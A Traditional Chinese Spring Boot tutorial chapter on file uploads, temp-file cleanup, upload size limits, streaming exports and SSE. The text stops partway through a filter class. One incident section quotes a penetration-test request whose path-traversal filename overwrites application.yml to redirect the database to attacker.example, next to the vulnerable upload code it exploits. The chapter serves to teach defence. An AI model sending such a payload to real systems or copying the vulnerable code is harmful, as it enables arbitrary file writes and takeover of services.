# 第 05 章：檔案上傳、下載與串流

> 前四章的每一個請求與回應都是 JSON。這一章要處理**不是 JSON 的東西**。
>
> 而「不是 JSON」帶來的不只是語法差異，是**一整組新的失敗模式**：
> body 大到放不進記憶體、檔名是攻擊者控制的字串、
> 回應在第一個 byte 送出後就無法改狀態碼、連線要維持一個小時不斷。
>
> **這一章的每一節都在回答同一個問題：**
> 當「請求或回應大到無法一次拿在手上」時，前四章建立的所有假設哪些還成立？

---

## 5.1 學習目標

完成本章後，你應該可以：

- 說出一個 `multipart/form-data` 請求在 wire 上長什麼樣，以及 Servlet 容器怎麼把它切成 `Part`。
- 說明 `max-file-size`、`max-request-size`、`file-size-threshold`、`location` 四個設定值**各自管什麼**，以及設錯的具體症狀。
- 指出 multipart 的暫存檔在哪裡、誰負責刪、**什麼情況下不會被刪**。
- **說明為什麼 `getOriginalFilename()` 是不可信輸入**，並寫出一個能擋四種攻擊的檔名處理器。
- 說明為什麼副檔名與 `Content-Type` 都不能用來判斷檔案型別，並用 magic number + 二次編碼做真正的驗證。
- 說出 ZIP bomb、圖片解壓縮炸彈、SVG 內嵌 script 三種內容攻擊的原理與防法。
- 判斷一個上傳需求該用 `multipart` 還是**預簽名 URL**，並說出決定性的理由。
- **寫出中文檔名不會亂碼的 `Content-Disposition`**，並說明 RFC 6266 的 `filename` 與 `filename*` 為什麼要同時給。
- 說明 `ResponseEntity<Resource>` 為什麼會自動支援 `Range` 請求，以及它什麼時候回 `206` / `416`。
- **用 `StreamingResponseBody` 匯出 41 萬筆訂單而不 OOM**，並說出它與 04 章 response 包裝為什麼衝突。
- 回答「串流到一半失敗了怎麼辦」——以及為什麼這個問題沒有漂亮的答案。
- 實作 `202 Accepted` + 輪詢的非同步匯出工作，含進度回報與一次性下載連結。
- 說出 SSE 的完整生命週期（`onCompletion` / `onTimeout` / `onError`），並實作心跳與 `Last-Event-ID` 重連。
- **說明為什麼 SSE 在 Nginx 後面預設不會動**，以及應用層可以怎麼自救。
- 說出 SSE 在多實例部署下為什麼一定要 Redis pub/sub。
- 為上傳、下載、串流、SSE 各寫出測試。

---

## 5.2 先看見痛：四次真實事故

### 5.2.1 事故一：磁碟在星期日凌晨被塞爆

**現場**：週日 03:14，`/actuator/health` 開始回 503。整個服務不接受任何請求。

```
2026-08-16 03:14:22 ERROR o.a.c.c.C.[.[.[/] - Servlet.service() threw exception
java.io.IOException: No space left on device
	at java.base/sun.nio.ch.FileDispatcherImpl.write0(Native Method)
```

`df -h` 的結果：

```
Filesystem      Size  Used Avail Use% Mounted on
/dev/nvme0n1p1   50G   50G     0 100% /
```

`du -sh` 一層一層往下找：

```
$ du -sh /tmp/*
47G	/tmp/tomcat.8080.4471852649032/work/Tomcat/localhost/ROOT
```

裡面是 **19,412 個檔案**，名字長這樣：

```
upload_8f2a1c94_00000001.tmp
upload_8f2a1c94_00000002.tmp
upload_a71b3d05_00000001.tmp
...
```

**這些是 multipart 的暫存檔。**

**為什麼沒被刪？** 三個原因疊在一起（5.3.4 會逐一解釋）：

| # | 原因 |
|---|---|
| 1 | 上傳端點在驗證失敗時直接 `throw`，而**暫存檔的清理綁在請求結束**，某些路徑上沒觸發 |
| 2 | 有一個 `@Async` 的縮圖處理拿著 `MultipartFile` 到背景執行緒 → 請求結束時檔案被刪 → 背景失敗 → **重試機制又存了一份到別的地方** |
| 3 | `file-size-threshold` 設成 `1MB`，而商品圖平均 2.4MB → **每一張都落地** |

⚠️ **最貴的部分不是磁碟滿**，是「磁碟滿」讓**所有**端點掛掉。
一個上傳功能的 bug，讓整個服務的可用性歸零。

### 5.2.2 事故二：一個檔名蓋掉了設定檔

**滲透測試報告，嚴重度 Critical：**

```http
POST /products/P-1001/images HTTP/1.1
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="../../../../opt/app/config/application.yml"
Content-Type: image/jpeg

spring:
  datasource:
    url: jdbc:mysql://attacker.example:3306/pwned
------x--
```

**當時的程式碼**：

```java
@PostMapping("/products/{productId}/images")
public ImageResponse upload(@PathVariable String productId,
                            @RequestParam("file") MultipartFile file) throws IOException {

    Path target = Paths.get("/var/data/uploads").resolve(file.getOriginalFilename());
    file.transferTo(target);                       // 🔴
    return new ImageResponse(target.toString());
}
```

`Paths.get("/var/data/uploads").resolve("../../../../opt/app/config/application.yml")`
的結果是 **`/opt/app/config/application.yml`**。

`resolve()` **不會**幫你阻止 `..`。它只是路徑串接。

**這個漏洞的能力**：任意檔案寫入。可以蓋設定檔、蓋 `.ssh/authorized_keys`、
在靜態資源目錄放一個 `.jsp`（如果容器會執行它）。**等於遠端程式碼執行。**

而修法**不是**「檢查有沒有 `..`」（5.4 會說明那為什麼不夠）。

### 5.2.3 事故三：匯出 41 萬筆訂單 → 三次 OOM

04 章 4.2.3 的續集。營運要月報表，`size=1000000` 被硬上限擋掉之後，
你為他做了一個「匯出全部」的端點：

```java
@GetMapping(value = "/orders/export", produces = "text/csv")
public ResponseEntity<byte[]> export(OrderFilter filter) {
    List<OrderSummary> all = orderService.findAll(filter);      // 🔴 41 萬筆進 List
    StringBuilder csv = new StringBuilder();                    // 🔴 全部進 StringBuilder
    csv.append("orderId,customerId,status,total,createdAt\n");
    for (OrderSummary o : all) {
        csv.append(o.orderId()).append(',')/* … */.append('\n');
    }
    return ResponseEntity.ok()                                  // 🔴 再複製一次成 byte[]
            .header("Content-Disposition", "attachment; filename=orders.csv")
            .body(csv.toString().getBytes(StandardCharsets.UTF_8));
}
```

**記憶體帳單**（41 萬筆，每筆平均 12 個欄位）：

| 階段 | 大小 |
|---|---|
| `List<OrderSummary>`（物件 + 字串） | ≈ 780 MB |
| `StringBuilder`（char[]，UTF-16） | ≈ 148 MB |
| `csv.toString()`（再複製一份 char[]） | ≈ 148 MB |
| `getBytes(UTF_8)`（byte[]） | ≈ 74 MB |
| **同時存在的峰值** | **≈ 1.15 GB** |

容器的 heap 上限是 1 GB。

⚠️ **而最糟的是：這個端點被營運同時開了三個瀏覽器分頁。**
JVM 在 40 秒內 OOM 三次，Kubernetes 重啟了 pod 三次，
**期間所有正常的下單請求都失敗。**

**「一個報表功能造成下單中斷」** 是這一章最需要避免的事。

### 5.2.4 事故四：SSE 在正式環境「什麼都沒有」

你做了一個訂單狀態即時推播：

```java
@GetMapping(value = "/orders/{orderId}/events", produces = MediaType.TEXT_EVENT_STREAM_VALUE)
public SseEmitter events(@PathVariable String orderId) { /* … */ }
```

**本機測試完美。** `curl` 一下就看到事件一筆一筆吐出來。

**部署到正式環境（Nginx 在前面）之後：**

```
$ curl -N https://api.shop.example/orders/ord_1/events
（游標停在這裡，什麼都沒有）
（60 秒後）
（一次吐出 47 筆事件）
（然後連線斷掉）
```

前端的表現是：**畫面完全不動，然後突然全部更新，然後不再更新。**

**三個原因（5.11.7 會逐一解決）**：

| # | 原因 | 症狀 |
|---|---|---|
| 1 | Nginx 的 `proxy_buffering on`（預設） | 事件被緩衝，湊滿 buffer 才送 → 「一次吐 47 筆」 |
| 2 | Nginx 的 `proxy_read_timeout 60s`（預設） | 60 秒沒有資料就斷線 → 「然後斷掉」 |
| 3 | 沒有心跳 | 空閒連線被中間任何一層（LB、防火牆）回收 |

⚠️ **這個事故的特徵是「本機一定測不出來」** ——
因為本機沒有 Nginx。這類 bug 只能靠「知道它存在」來預防。

### 5.2.5 這四個痛的共同點

| 事故 | 表面問題 | 真正的問題 |
|---|---|---|
| 磁碟塞爆 | 暫存檔沒刪 | **不知道「檔案在哪裡、誰負責刪」** |
| 檔名穿越 | 沒過濾 `..` | **把客戶端字串當成路徑用** |
| 匯出 OOM | 沒串流 | **假設「回應可以一次拿在手上」** |
| SSE 不動 | Nginx 設定 | **假設「本機能動就代表能動」** |

**四個都是「假設被打破」而不是「語法寫錯」。**
所以這一章的重點不是 API 用法，而是**每個機制的邊界條件**。

---

## 5.3 multipart 的機制

### 5.3.1 一個 multipart 請求在 wire 上長什麼樣

先看原始位元組，因為後面所有的設定與限制都是在講這些東西：

```http
POST /products/P-1001/images HTTP/1.1
Host: api.shop.example
Authorization: Bearer eyJhbGci...
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Length: 245789

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file"; filename="主圖.jpg"
Content-Type: image/jpeg

<245113 bytes 的二進位資料>
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="metadata"
Content-Type: application/json

{"alt":"商品主圖","position":1}
------WebKitFormBoundary7MA4YWxkTrZu0gW--
```

**五個要看懂的細節**：

| 細節 | 說明 |
|---|---|
| `boundary` | 由客戶端產生的分隔字串。**伺服器必須逐 byte 掃描找它**，這是 multipart 解析比 JSON 貴的原因 |
| 每個 part 有自己的 `Content-Type` | 所以同一個請求裡可以有 JSON part 與二進位 part |
| `filename` 只出現在檔案 part | 沒有 `filename` 的 part 是「表單欄位」，Spring 會綁到 `@RequestParam String` |
| `filename="主圖.jpg"` | ⚠️ **這裡的編碼是歷史災難**（5.3.5 會展開） |
| 最後一行以 `--` 結尾 | 這是「結束 boundary」。缺了它請求是不完整的 |

⚠️ **`Content-Length: 245789` 是整個 multipart body 的長度，不是檔案的長度。**
`max-request-size` 管前者，`max-file-size` 管後者 —— 這是兩個不同的數字。

### 5.3.2 Spring Boot 的處理鏈

```
客戶端
  │  Content-Type: multipart/form-data; boundary=...
  ▼
┌──────────────────────────────────────────────────────────┐
│ Tomcat（Servlet 容器）                                    │
│  · 由 @MultipartConfig 決定限制（Boot 從 yml 轉過來）        │
│  · request.getParts() 時才真正解析                         │
│  · 每個 Part：小的留記憶體、大的寫到 location 的暫存檔       │
└──────────────────────────────────────────────────────────┘
  ▼
┌──────────────────────────────────────────────────────────┐
│ Filter chain（04 章）                                     │
│  ⚠️ CachedBodyFilter（-117）必須跳過 multipart！            │
│     否則 256 KB 的上限會把 2 MB 的圖片截斷                   │
└──────────────────────────────────────────────────────────┘
  ▼
┌──────────────────────────────────────────────────────────┐
│ DispatcherServlet.checkMultipart()                       │
│  · 問 MultipartResolver：這是 multipart 嗎？                │
│  · 是 → 把 request 包成 MultipartHttpServletRequest        │
│  ⚠️ 這一步在 getHandler() 之前 —— 所以「解析失敗」發生在      │
│     還不知道要打給哪個 Controller 的時候（5.3.7 的關鍵）      │
└──────────────────────────────────────────────────────────┘
  ▼
┌──────────────────────────────────────────────────────────┐
│ RequestPartMethodArgumentResolver（@RequestPart）          │
│ RequestParamMethodArgumentResolver（@RequestParam）        │
│  · 把 Part 轉成 MultipartFile                             │
│  · 或用 HttpMessageConverter 把 JSON part 轉成 DTO         │
└──────────────────────────────────────────────────────────┘
  ▼
Controller
  ▼
┌──────────────────────────────────────────────────────────┐
│ DispatcherServlet.cleanupMultipart()（finally 區塊）       │
│  · resolver.cleanupMultipart() → 刪除暫存檔                │
│  ⚠️ 這是暫存檔唯一的自動清理點（5.3.4）                      │
└──────────────────────────────────────────────────────────┘
```

**Spring Boot 3.x 用的 resolver 是 `StandardServletMultipartResolver`**（基於 Servlet 3.0 的 `Part` API）。

⚠️ **Spring Framework 6 已經移除 `CommonsMultipartResolver`。**
如果你在網路上看到 `commons-fileupload` 的教學，那是 Spring 5 以前的做法。
Boot 3 專案不需要也不能用它（`spring.http.multipart.*` 這個 prefix 也早就不存在了，
正確的是 `spring.servlet.multipart.*`）。

### 5.3.3 四個設定值的真正意義 ★

```yaml
spring:
  servlet:
    multipart:
      enabled: true                  # 預設 true
      max-file-size: 10MB            # 單一檔案上限
      max-request-size: 20MB         # 整個請求上限
      file-size-threshold: 0B        # 超過這個大小就寫到磁碟
      location:                      # 暫存目錄（空 = 容器預設）
      resolve-lazily: false          # 預設 false
```

| 設定 | Boot 預設 | 管什麼 | 設錯的症狀 |
|---|---|---|---|
| `max-file-size` | **1MB** | 單一 part 的大小 | 手機拍的照片（3～8MB）全部失敗 |
| `max-request-size` | **10MB** | 所有 part 加總 + boundary 開銷 | 一次上傳 5 張圖必失敗（即使每張都合法） |
| `file-size-threshold` | **0B** | 小於它 → 留在記憶體；大於它 → 寫暫存檔 | 設大 → 記憶體壓力；設 0 → **每個上傳都是一次磁碟寫入** |
| `location` | 容器暫存目錄 | 暫存檔放哪裡 | 用 `/tmp` → 容器重啟就空（好）但可能與別的東西搶空間（壞） |
| `resolve-lazily` | `false` | 何時解析 | `true` 時解析延到第一次取 part（少見但對「先驗證 header 再決定要不要收 body」有用） |

**`file-size-threshold` 的取捨要算過再設**：

```
每秒 20 次上傳 × 平均 2.4 MB
= 48 MB/s 的資料流

threshold = 0B  →  每個檔案都落地
             磁碟寫入 48 MB/s（SSD 沒問題，但 IOPS 與雲端硬碟配額要看）
             記憶體佔用：≈ 0（串流寫入）

threshold = 5MB →  全部留在記憶體
             記憶體佔用：20 × 2.4 MB = 48 MB（× 平均處理時間 1.5 秒 ≈ 72 MB 常駐）
             磁碟寫入：0

threshold = 5MB 且突然來了 200 個併發上傳
             記憶體佔用：200 × 2.4 MB = 480 MB  ← 🔴 這是 OOM
```

⚠️ **`file-size-threshold` 是一個「隱藏的記憶體乘數」。**
它的值 × 併發上傳數 = 你需要的額外 heap。

**shop-service 的決定**：

```yaml
spring:
  servlet:
    multipart:
      max-file-size: 10MB
      max-request-size: 20MB
      file-size-threshold: 128KB     # ★ 只讓「小到不痛」的檔案留在記憶體
      location: /var/tmp/shop-uploads
```

**理由**：

| 決定 | 理由 |
|---|---|
| `threshold: 128KB` | 頭像縮圖、簽名圖（< 128KB）不落地；商品主圖（MB 級）落地。**併發 200 的記憶體上限是 25 MB，可以接受** |
| `location` 明確指定 | 才能 (a) 掛獨立的 volume，磁碟滿了不會影響根目錄（事故 5.2.1）(b) 設 quota (c) 在監控上單獨看它 |
| `max-file-size: 10MB` | 對照 03-rest-api 1.11.1 的決定：> 10MB 一律走預簽名 URL（5.7） |

⚠️ **`location` 指定的目錄必須存在且可寫，否則啟動時不會錯，
而是在第一次上傳時才拋 `IOException`。** 用 initContainer 或 Dockerfile 建好它：

```dockerfile
RUN mkdir -p /var/tmp/shop-uploads && chown 1000:1000 /var/tmp/shop-uploads
```

### 5.3.4 暫存檔在哪裡、誰負責刪、什麼情況不會被刪 ★

**在哪裡**（沒設 `location` 時）：

```bash
# Tomcat 的 servlet context 暫存目錄
$ ls /tmp/tomcat.8080.4471852649032/work/Tomcat/localhost/ROOT/
upload_8f2a1c94-3e21-4b7d-9c11-a2f3d4e5b6c7_00000000.tmp
```

**誰負責刪**：`DispatcherServlet` 的 `finally` 區塊。

```java
// org.springframework.web.servlet.DispatcherServlet#doDispatch（簡化）
finally {
    if (multipartRequestParsed) {
        cleanupMultipart(processedRequest);       // ★ 唯一的自動清理點
    }
}
```

`StandardServletMultipartResolver.cleanupMultipart()` 會對每個 `Part` 呼叫 `part.delete()`。

**什麼情況不會被刪** —— 這是事故 5.2.1 的核心：

| 情況 | 為什麼 |
|---|---|
| **請求還沒進 `DispatcherServlet` 就結束** | Filter 直接回應（例如限流擋掉、body 太大擋掉）→ `multipartRequestParsed` 是 `false`，但如果 Filter 呼叫過 `getParameter()` 觸發了解析，暫存檔就孤兒了 |
| **非同步請求還在跑** | `Callable` / `StreamingResponseBody` 回傳後 `doDispatch` 就結束了 → 暫存檔被刪 → 背景執行緒讀到 `FileNotFoundException` |
| **你自己 `transferTo()` 到別處但沒處理失敗** | `transferTo` 成功會搬走檔案；失敗則暫存檔還在，等 `cleanupMultipart` 刪。**但如果你在 `transferTo` 之後又拋例外並被某層吃掉，就要看那層有沒有回到 `DispatcherServlet`** |
| **JVM 被 SIGKILL** | 沒有 `finally` 會執行。**這是為什麼 `location` 需要一個開機清理** |
| **`@Async` 拿著 `MultipartFile`** ★ | 請求結束 → 檔案已刪 → 背景任務失敗 |

⚠️ **最後一條是最常見也最難查的**：

```java
@PostMapping("/products/{productId}/images")
public ImageResponse upload(@RequestParam("file") MultipartFile file) {
    thumbnailService.generateAsync(file);          // 🔴 @Async 方法
    return new ImageResponse(/* … */);
}
```

**這段程式碼在本機一定會動**（因為請求處理很快，背景任務在檔案被刪之前就讀完了），
**在正式環境會間歇性失敗**（負載高時 `@Async` 的佇列有延遲）。

**修法：在請求執行緒內就把 bytes 讀出來或搬到你自己管理的位置。**

```java
@PostMapping("/products/{productId}/images")
public ImageResponse upload(@RequestParam("file") MultipartFile file) throws IOException {

    // ★ 在請求執行緒內完成「把資料搬到我們自己管的地方」
    StoredObject stored = objectStorage.store(file.getInputStream(), file.getSize(), key);

    // 背景任務只帶 key（一個字串），不帶 MultipartFile
    thumbnailService.generateAsync(stored.key());
    return new ImageResponse(/* … */);
}
```

> **一條可以背下來的規則**：
> **`MultipartFile` 的生命週期 = 請求的生命週期。**
> 它不可以跨出 Controller 方法（不能進 `@Async`、不能進 `SseEmitter` 的回呼、
> 不能放進快取、不能存進欄位）。

**開機清理的安全網**（防 SIGKILL 留下的孤兒）：

```java
package example.shop.common.upload;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.boot.context.event.ApplicationReadyEvent;
import org.springframework.context.event.EventListener;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.springframework.util.StringUtils;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.time.Duration;
import java.time.Instant;
import java.util.stream.Stream;

/**
 * multipart 暫存檔的孤兒清理。
 *
 * <p>★ 為什麼需要它？{@code DispatcherServlet} 的 finally 已經會清理，
 * 但下列情況不會執行到 finally：
 * <ul>
 *   <li>JVM 被 SIGKILL（OOM killer、{@code kubectl delete pod --force}）。</li>
 *   <li>容器被驅逐（eviction）。</li>
 * </ul>
 *
 * <p>⚠️ 這個類別是「安全網」而不是「主要機制」。
 * 如果你發現它每次都刪掉很多檔案，那代表主要機制壞了，要去查原因，
 * 而不是把清理排程調頻繁。
 */
@Component
public class MultipartTempSweeper {

    private static final Logger log = LoggerFactory.getLogger(MultipartTempSweeper.class);

    /** 只刪超過這個年齡的檔案 —— 避免刪掉正在被使用的暫存檔。 */
    private static final Duration MIN_AGE = Duration.ofHours(2);

    private final Path location;

    public MultipartTempSweeper(
            @Value("${spring.servlet.multipart.location:}") String location) {
        this.location = StringUtils.hasText(location) ? Path.of(location) : null;
    }

    /** 啟動時掃一次（處理上次被 kill 留下的）。 */
    @EventListener(ApplicationReadyEvent.class)
    public void sweepOnStartup() {
        sweep("startup");
    }

    /** 每小時掃一次（處理執行期間的漏網）。 */
    @Scheduled(fixedDelay = 3_600_000L, initialDelay = 3_600_000L)
    public void sweepPeriodically() {
        sweep("scheduled");
    }

    private void sweep(String trigger) {
        if (location == null) {
            // ⚠️ 沒設 location 時我們不敢動容器的暫存目錄 —— 那裡面還有別的東西
            return;
        }
        if (!Files.isDirectory(location)) {
            log.warn("multipart location 不存在或不是目錄 path={}", location);
            return;
        }

        Instant cutoff = Instant.now().minus(MIN_AGE);
        int deleted = 0;
        long bytes = 0;

        try (Stream<Path> files = Files.list(location)) {
            for (Path file : files.toList()) {
                try {
                    if (!Files.isRegularFile(file)) continue;
                    if (Files.getLastModifiedTime(file).toInstant().isAfter(cutoff)) continue;

                    long size = Files.size(file);
                    Files.delete(file);
                    deleted++;
                    bytes += size;
                } catch (IOException e) {
                    // ★ 單一檔案失敗不能中斷整個清理（可能只是被別的程序鎖住）
                    log.debug("刪除暫存檔失敗 path={} reason={}", file, e.getMessage());
                }
            }
        } catch (IOException e) {
            log.warn("掃描 multipart 暫存目錄失敗 path={}", location, e);
            return;
        }

        if (deleted > 0) {
            // ★ WARN 而不是 INFO：有孤兒代表主要機制有問題，值得被看到
            log.warn("清理 multipart 孤兒暫存檔 trigger={} count={} bytes={}",
                     trigger, deleted, bytes);
        }
    }
}
```

⚠️ **`MIN_AGE = 2 小時` 不是隨便選的**：它必須大於「最慢的上傳請求」的時間。
如果你有一個允許上傳 5 分鐘的端點，2 小時很安全；
但如果你把它設成 1 分鐘，就會刪掉正在被寫入的檔案 —— **症狀是間歇性的上傳失敗，極難查**。

**還要一個磁碟監控**（事故 5.2.1 真正需要的東西）：

```yaml
# prometheus/rules/shop-api-storage.yml
groups:
  - name: shop-api-storage
    rules:
      - alert: MultipartTempDirGrowing
        # ★ 用「檔案數」而不是「大小」—— 大小會被單一大檔誤導
        expr: shop_multipart_temp_files > 500
        for: 15m
        labels:
          severity: warning
        annotations:
          summary: "multipart 暫存檔累積（可能有洩漏）"

      - alert: DiskSpaceLow
        expr: disk_free_bytes{mountpoint="/var/tmp"} / disk_total_bytes{mountpoint="/var/tmp"} < 0.15
        for: 5m
        labels:
          severity: critical
```

### 5.3.5 `MultipartFile` 的六個方法與各自的陷阱

```java
public interface MultipartFile extends InputStreamSource {
    String getName();                    // 表單欄位名（"file"）
    String getOriginalFilename();        // 客戶端送的檔名 —— ⚠️ 不可信
    String getContentType();             // 客戶端送的 MIME —— ⚠️ 不可信
    boolean isEmpty();
    long getSize();                      // bytes
    byte[] getBytes() throws IOException;        // ⚠️ 整個進記憶體
    InputStream getInputStream() throws IOException;
    void transferTo(File dest) throws IOException;
    void transferTo(Path dest) throws IOException;   // default 方法
    Resource getResource();                          // default 方法
}
```

| 方法 | 陷阱 |
|---|---|
| `getName()` | 是**欄位名**不是檔名。很多人搞錯 |
| `getOriginalFilename()` | 客戶端完全可控。可能是 `null`、可能含路徑、可能含 null byte、可能是 300 個字（5.4） |
| `getContentType()` | 客戶端完全可控。`image/jpeg` 不代表它是 JPEG（5.5） |
| `isEmpty()` | **只表示 size == 0**。使用者選了一個 0 byte 的檔案也是 `false`？不，是 `true`。但「沒選檔案」在有些瀏覽器會送一個 filename 為空的 part |
| `getSize()` | 這個**可信**（伺服器算的）。⚠️ 但它是「已接收的大小」，串流未完成時不要用 |
| `getBytes()` | 🔴 **整個檔案進記憶體**。10 MB 檔案 × 50 併發 = 500 MB |
| `getInputStream()` | ✅ 正確的讀法。⚠️ **只能讀一次**（5.5.7 會處理「要驗證又要儲存」） |
| `transferTo(Path)` | ⚠️ 目標路徑必須是你算出來的，**絕不能來自 `getOriginalFilename()`**（事故 5.2.2） |

**`getOriginalFilename()` 的編碼問題**：

```
Content-Disposition: form-data; name="file"; filename="主圖.jpg"
```

這裡的 `主圖.jpg` 是什麼編碼？**RFC 7578 說應該是 UTF-8，但實務上要看客戶端。**

| 客戶端 | 行為 |
|---|---|
| 現代瀏覽器（Chrome / Firefox / Safari） | UTF-8 原字節 |
| 舊 IE | Big5 / GBK（依系統語言） |
| 某些 Java HTTP client | ISO-8859-1 逐字節 |
| curl | 你給它什麼就送什麼 |

Tomcat 用 `Connector` 的 URI encoding（Boot 預設 UTF-8）來解 —— 所以現代瀏覽器沒問題。

⚠️ **但你不需要在意這件事**，因為 5.4 的結論是：
**不要用客戶端的檔名當儲存檔名。** 原檔名只存進資料庫當「顯示名稱」。

### 5.3.6 multipart + JSON 混合請求的三種寫法

需求：上傳圖片，同時帶結構化的 metadata（alt 文字、排序位置），而且 metadata **要能被驗證**。

**寫法 A：`@RequestPart` + JSON part** ✅ 推薦

```java
@PostMapping(value = "/products/{productId}/images",
             consumes = MediaType.MULTIPART_FORM_DATA_VALUE)
public ResponseEntity<ProductImageResponse> upload(
        @PathVariable("productId") String productId,
        @RequestPart("file") MultipartFile file,
        @RequestPart("metadata") @Valid ImageMetadata metadata,     // ★ JSON → DTO + 驗證
        @CurrentActor Actor actor) { /* … */ }
```

```java
public record ImageMetadata(
    @Size(max = 200) String alt,
    @Min(0) @Max(99) Integer position,
    @Size(max = 20) List<@Pattern(regexp = "^[a-z0-9-]{1,30}$") String> tags
) {}
```

**客戶端要送對的 `Content-Type`**：

```http
------x
Content-Disposition: form-data; name="metadata"
Content-Type: application/json          ← ★ 這一行是關鍵

{"alt":"商品主圖","position":1}
```

⚠️ **如果客戶端沒送這一行**，Spring 會拿不到 converter（part 的 content type 是
`text/plain` 或缺失）→ 拋 `HttpMediaTypeNotSupportedException`。

⚠️ **`@RequestPart` 與 `@RequestParam` 的差別很重要**：

| 註解 | 對 part 的處理 |
|---|---|
| `@RequestParam` | 用 `Converter`（字串轉換）。`@RequestParam ImageMetadata` **不會**做 JSON 反序列化 |
| `@RequestPart` | 用 `HttpMessageConverter`（看 part 的 `Content-Type`）。**這是唯一能把 JSON part 轉成 DTO 的方式** |

**寫法 B：扁平的表單欄位**

```java
public ResponseEntity<ProductImageResponse> upload(
        @PathVariable String productId,
        @RequestParam("file") MultipartFile file,
        @RequestParam(value = "alt", required = false) @Size(max = 200) String alt,
        @RequestParam(value = "position", defaultValue = "0") @Min(0) int position) { }
```

| | 優點 | 缺點 |
|---|---|---|
| 寫法 B | 客戶端最好送（HTML form 原生支援）；不用管 part 的 content type | 巢狀結構沒辦法表達；欄位一多方法簽章就爆掉；**OpenAPI 描述較弱** |

**寫法 C：綁到一個物件上**（介於 A、B 之間）

```java
public ResponseEntity<ProductImageResponse> upload(
        @PathVariable String productId,
        @Valid ImageUploadForm form) { }              // ★ 沒有註解 = @ModelAttribute

public record ImageUploadForm(
    MultipartFile file,                                // ★ 可以是 record 的元件
    @Size(max = 200) String alt,
    @Min(0) @Max(99) int position
) {}
```

⚠️ **`record` + `@ModelAttribute` 需要 Spring 6.1+**（建構子綁定）。
Spring 6.0 以前 `@ModelAttribute` 需要無參建構子 + setter，所以 `record` 不能用。

**shop-service 的選擇**：

| 端點 | 寫法 | 理由 |
|---|---|---|
| `POST /products/{id}/images` | **A** | metadata 有 `tags` 陣列，B 表達不了 |
| `POST /orders/{id}/receipts` | **B** | 只有一個 `note` 欄位，不值得多一個 DTO |
| `POST /order-import-jobs` | **A** | 匯入設定有巢狀結構（欄位對映表） |

### 5.3.7 multipart 的例外與統一錯誤格式 ★

這一節要回答 03 章 3.3.5「哪些例外進不了 advice」在 multipart 上的答案。

**四種失敗與各自的路徑**：

```
① 檔案超過 max-file-size
   Tomcat 解析時偵測 → IllegalStateException（Tomcat 的 SizeLimitExceededException）
   → StandardServletMultipartResolver 包成 MaxUploadSizeExceededException
   → DispatcherServlet.checkMultipart() 拋出
   → doDispatch 的 catch → processHandlerException（handler == null）
   → ✅ 進得了 @RestControllerAdvice

② 整個請求超過 max-request-size
   同上 → ✅ 進得了 advice

③ boundary 壞掉 / body 被截斷
   → MultipartException（不是 MaxUploadSizeExceededException）
   → ✅ 進得了 advice

④ Nginx 的 client_max_body_size 擋掉
   → 🔴 你的應用程式完全沒看到這個請求
   → Nginx 回它自己的 HTML 413（03 章 3.10.3 已處理）
```

⚠️ **①②③ 進得了 advice，但有一個大坑：`max-swallow-size`。**

**問題的機制**：伺服器決定拒絕請求時，客戶端**還在傳剩下的 20 MB**。
HTTP/1.1 是同一條 TCP 連線，伺服器如果不把剩下的資料讀完（swallow），
就沒辦法在同一條連線上回應。Tomcat 的 `maxSwallowSize`（預設 **2 MB**）
決定它願意讀掉多少「不要的資料」。

```
客戶端上傳 50 MB（max-file-size 是 10MB）
  ↓
Tomcat 讀到 10 MB + 1 byte 時決定拒絕
  ↓
還有 40 MB 在路上，超過 maxSwallowSize（2 MB）
  ↓
Tomcat 直接關閉連線（RST）
  ↓
客戶端看到的是：
  curl: (55) Send failure: Broken pipe
  或 net::ERR_CONNECTION_RESET
  ★ 而不是你精心設計的 413 Problem JSON
```

**這就是「advice 有寫，但使用者永遠看不到」的原因。**

**兩個選項**：

```yaml
server:
  tomcat:
    # 選項 1：讀完所有資料，保證能回應（但要付頻寬與時間）
    max-swallow-size: -1        # -1 = 無限
```

| 選項 | 優點 | 缺點 |
|---|---|---|
| `max-swallow-size: -1` | ✅ 使用者一定收到 413 JSON，錯誤訊息清楚 | 🔴 攻擊者可以送 10 GB 讓你讀完才拒絕 = 頻寬 DoS |
| 保持 2MB（預設） | ✅ 不會被頻寬攻擊 | 🔴 正常使用者上傳大檔看到 connection reset，不知道為什麼 |

**shop-service 的做法：都不選，改在更前面擋。**

```nginx
# nginx.conf —— 讓 Nginx 用它自己的 413 擋掉（03 章 3.10.3 已讓它回 JSON）
client_max_body_size 21m;          # ★ 略大於 max-request-size（20MB）
```

```yaml
server:
  tomcat:
    max-swallow-size: 2MB          # 保持預設；正常流量不會碰到
```

**理由**：

| 層 | 上限 | 誰會碰到 |
|---|---|---|
| Nginx `client_max_body_size` | 21 MB | 惡意或誤用的超大請求 → Nginx 早早拒絕，**不消耗你的應用執行緒** |
| Tomcat `max-request-size` | 20 MB | 幾乎碰不到（Nginx 先擋了） |
| Tomcat `max-file-size` | 10 MB | ✅ **這是使用者真正會碰到的那一條**，而 10 MB 遠小於 2 MB 的 swallow buffer 嗎？ |

⚠️ **等等，最後一格有問題**：使用者上傳一個 15 MB 的檔案時，
Tomcat 在 10 MB 處拒絕，剩下 5 MB > 2 MB 的 swallow buffer → **還是會 connection reset**。

**所以要再加一層：在 Filter 用 `Content-Length` 預先擋掉。**
04 章的 `RequestSizeLimitFilter`（order -118）已經做了這件事，這裡只要讓它認得 multipart：

```java
package example.shop.common.web;

import example.shop.common.error.ErrorCode;
import example.shop.common.upload.UploadProperties;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.util.unit.DataSize;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Map;

/**
 * 用 {@code Content-Length} 在「讀 body 之前」擋掉過大的請求。
 *
 * <p>★ 為什麼這一層是必要的（不是重複 Tomcat 的檢查）：
 * <ul>
